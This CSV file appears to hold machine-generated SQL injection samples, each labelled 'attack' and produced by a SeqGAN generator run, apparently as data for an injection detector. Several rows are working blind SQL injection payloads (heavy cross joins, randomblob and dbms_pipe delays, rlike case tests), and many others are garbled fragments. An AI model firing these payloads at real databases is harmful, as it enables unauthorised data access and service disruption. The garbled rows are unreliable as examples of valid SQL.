label,payload,family,payload_type,method,run_id,sample_index
attack,"1%""  =  ""5000000s  )   (  select cosupt  9354  )  (  --s_pess  (     )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,497
attack,"%""  =  ""nall_ses collesumsas t1,rdblte  (  ces  (  ""gzhp""  (    (  c  (  9607  =  )  )  )   (  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,498
attack,1   )    )  )      r,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,499
attack,1k%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,500
attack,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'nomas t1,alles ables  (  (  ||  (  (  (  =  )  )  )   where 4212  =  5127  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,501
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,502
attack,49065000000     (  select couuses _x,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,503
attack,"1  )  )   -- where r  )  )   awpesakeelususesesag  (  (  (  r  (  'qqpjq'||chr  dras awuxuses  (  79  )  (  )  ,5""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""),where and    p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,504
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfst     (  8220  =  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,505
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  )   or 8384  =  like  (  '   '  =  'j.rumsas as t   4123  )  )     )    )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,506
attack,1%'qomf' runt  (  =  9687 or 9643  =    (    (  \akorakzzqt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,507
attack,-5067'   )    )    or 5903  =    (  'qqpobumserusesesat  (  68  )  ||  (  65  )  )a'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,508
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,509
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,510
attack,"-2912  )   and coususpt  (  char  (  char  (  (  79  n  )  ||h  (  9607  =  3056,500000000  =    (  '   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  'jvx",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,511
attack,"1  )   -- where 3175  =  ""    (  *  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,512
attack,-5067'   )    )    or 5903  =    (  'qumpest  (  (  =  =    (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,513
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,514
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,515
attack,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""q5000000  (  (  65  )  )   and 3018    =  ""g  ((  )  (  4297  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,516
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,517
attack,"selects8673alumsageresere  (  (  (  (  (  69  )  ||chr  (  (  (  = where 4297  =  1,rdkzqandyxpuserieiesex  (  (  (  (  *  )  )   and(  ,5  )  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,518
attack,"cvuntablest  (  (  (  load_file  (  101  )  ||char  (  (  3595  )  (  1,5000000   )    )   )   and where like db$_mpedt  )  )  )    (  )  )   and   (  =    (  79  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,519
attack,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""faps talesesereas  (  500000000  (  (  69  =  3902  )      )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,520
attack,"caseystawoosesystablteserereseserzerere  (/   )     )    )   where dkmast  (  ,null  =  like  (  83  (  2367  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,521
attack,"-8673""   )    )     =     (    (   ""zk",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,522
attack,"1'||  (  select 'zqk'  )   and    (    (   'vufpees'  =  'srte_uc_ies_serieg  (  (  (  cers  (  (    87  )  (   ""vfvh""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,523
attack,"1%'qwk'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qz""  =  ""q",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,524
attack,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""ableser  (  68    )  ||t  (  (  (  9354  )  )  --      ""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,525
attack,"1%""g  (  500000000   9432  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,526
attack,1  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,527
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kvkefppvf  (  7471  (  ,1  (  69  )    (  7182  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,528
attack,"-9688%'  =  'nj)   from systalles ast3,rdbtallas t3,rdb$collt  (  (  (  (  90  )  (  87  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,529
attack,   +x,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,530
attack,1  )   where iounajkf  (     (    101   )    )   where 9687  =  )awjg,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,531
attack,1%)   where andusas t  )  )  )    )  )    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,532
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  '= and ""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ums_pas tazq'  )   and    (    (   'vka"" like ""w",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,533
attack,"-2912""   omawkf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,534
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,535
attack,"1'||  (  select 'vntypeser  (  (  =  8407  )  -- or  =  3, and t  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,536
attack,"1""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,537
attack,select)awk,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,538
attack,1  )   and 3707  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,539
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,540
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,541
attack,15 where   =  8220  =    (  7007  =      )  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,542
attack,"1%'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ah"" like ""hrxp c_susess  (  select couseum_pec rs as t  )    )  ,0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,543
attack,selectc  (  *  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,544
attack,1 where   (  (  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,545
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,546
attack,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""   f""  =  ""sas t3,rdb$colusers as t3,all_usess t5  )  --   (  )   alhr  =  7471  )  ||chrale  (  (  *  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,547
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,548
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,549
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,550
attack,1  )   wherex  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,551
attack,"1""akzq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'kg_peres(  )  (  1041  =    (    ,null  )  neayserusess as  (  (  *  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,552
attack,-3596qgehsy  (  (  101  )  3056r  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,553
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,554
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,555
attack,-4889'qzqk_mesesas t  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,556
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,557
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,558
attack,-5067'   )    )    or 5903  =    (  'qzqkmpiperesesrnes  =    (  5127  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,559
attack,1%vkz103q  (  9354  )  79  )  'bhlx' g  =    (  101  =    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,560
attack,select 5903  =    (  101  )  9687a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,561
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,562
attack,"-6846%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,563
attack,1%'  )   or 8384  =  like  (  '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,564
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,565
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,566
attack,"select couusest  (  68  )  ,5  )  )   andp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,567
attack,"select 7552  =al_est  (  101  )  ,5  )  ahr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,568
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,569
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,570
attack,"-9688%or""  )   ahrp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,571
attack,1%'  =  'nsaudausersas as t4  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,572
attack,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""appers at  (  67  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,573
attack,"  )   aunmas t3,rdb$ty  =    (load_file  (  83  --hsawkcese  (  (  ncn  =    (  ,)  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,574
attack,"-5158""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,575
attack,"1""  )   ains 5556  =    (  87,4062  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,576
attack,"79  ,5  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,577
attack,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '""  =  ""suseresege  (  (  69  (  (  (  109  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,578
attack,"""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,579
attack,"-' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '""  =  ""zvpuppperp_mest  (  x  (  79  (  69  )  ||  (  ,101  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,580
attack,1p  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,581
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%,%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,582
attack,"1ndombsyss ast1,systabas t1,ibless as t3,sysibsysifromains as t1,syss t2,rdb$typesysibmserstables t4,bll_users as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,583
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,584
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""   )     '+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,585
attack,-1422klxperseses asu  (  68  )  #,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,586
attack,"-""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""ge_us_suceseiq.rsalr  =  ""age_cei_sese  (  (   'ootz'  t  =  )  )   and 103  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,587
attack,select dbmas t  =   if   )    (  (  ||  (  83  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,588
attack,1  )  like,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,589
attack,select s 'qjle'  =    (  'abcdefg',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,590
attack,"1%3056,'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzcve.rxsest  (  79  (  116  )  --   )   dand  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,591
attack,"1%  ""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""   )    )   and or aqs t1gvatzqas where   =    (  101  )  (  7272   c where end 5903dbmas t4  ),ppbllatiene_usereteal  =  3056  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,592
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  )   or 8384  =  like  (  '   abg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'r  )  (  69  =  79,'bqndb$ete_ 7552  (  (  char  (  chr  (  90  =  '  (  103  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,593
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,594
attack,"select 5903  =    (  ,null  =    (  =    (  'abcdefg'geeseusererereseauses aptable  (  (  101  =  9687 or 9643  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,595
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,596
attack,"1%'  )   and 3202  =  like  (  'rras t3,t  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,597
attack,"-2912"" and 8312  =ppjners as t  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,598
attack,1'||  (  select 'xpp  (  90  )  (     )    uxm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,599
attack,"1  )   where 7272  =    (  ,5  )  )  -- den  ||cmsjeres  (  8220  =  7471  (  select count  (  *  )    des ast  67  )  ----",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,600
attack,"1  )   and 7427  =    (  ,5000000  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,601
attack,"select cousuucous/gte  cerser  (  (  ccalcols_pess ast  (  =      =  =  7471  (,0  5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,602
attack,"""ymss""  =    (  ,5  )  )     --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,603
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jhsa"" like ""cs as t4  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,604
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,605
attack,"select count  (  =  5333  =    (  (  )  ,0  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,606
attack,"1%1422%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,607
attack,1  )   where ypes t  )  )a'  )   and    (    (   'vk'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'rzcounfnele.r  (  (  (  65  )  nalles andt  )  )    )    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,608
attack,"-2912""  )    ||chsagererieseserereeere(  109  (  (  (  (  (  (  (  109  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,609
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'zqjeumas aumuntexsuqserstivm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,610
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,611
attack,"1%11""  =  ""uk  (  66  peh  (  (  (  69  )  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,612
attack,"87,"" g  (  'qzvzq'  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,613
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'qjjf'  =  'nsys_ptecolsers t    (  select  (  ||chre  (  65  )  (  *  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,614
attack,"-2912""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,615
attack,"-"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  ""nin  seausererex  (  cael 1  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,616
